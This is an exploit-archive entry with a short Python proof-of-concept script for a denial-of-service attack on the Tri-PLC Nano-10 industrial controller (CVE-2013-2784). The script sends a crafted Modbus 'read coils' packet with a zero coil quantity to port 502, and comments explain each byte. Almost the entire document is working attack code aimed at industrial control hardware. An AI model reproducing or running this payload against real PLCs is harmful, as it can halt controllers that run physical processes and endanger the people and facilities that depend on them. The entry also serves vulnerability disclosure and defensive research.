# Exploit Title: Tri-PLC Nano-10 DoS
# Date: 07/11/2013
# Exploit Author: Sapling
# Vendor Homepage: www.tri-plc.com
# Version: Firmware Version r81 and prior
# CVE : CVE-2013-2784
# ICSA: ICSA-13-189-02




# Python proof of concept
# For those more interested in the value meanings:
# Starting form the \x06 bit and down being the more important pieces
# \x06 length
# \x01 unit id
# \x01 function code (read coils)
# \x00\x00 start address
# \x00\x00 coil quantity


import sys
import socket

new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new.connect(('192.168.180.128', 502)) #Change the IP address to your PLC IP Address
new.send('\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x00')
            
